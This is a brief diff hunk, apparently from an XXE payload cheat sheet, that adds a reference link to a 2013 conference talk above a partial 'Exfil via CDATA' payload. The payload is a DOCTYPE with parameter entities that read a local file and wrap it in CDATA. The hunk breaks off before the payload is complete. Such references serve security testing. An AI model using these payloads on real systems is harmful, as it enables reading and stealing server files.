@@ -96,6 +96,7 @@ daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 ### Exfil via CDATA
 
 ```
+# Ref: http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf
 <!DOCTYPE updateProfile [
   <!ENTITY % file SYSTEM "file:///has/broken/xml">
   <!ENTITY % start "<![CDATA[" >
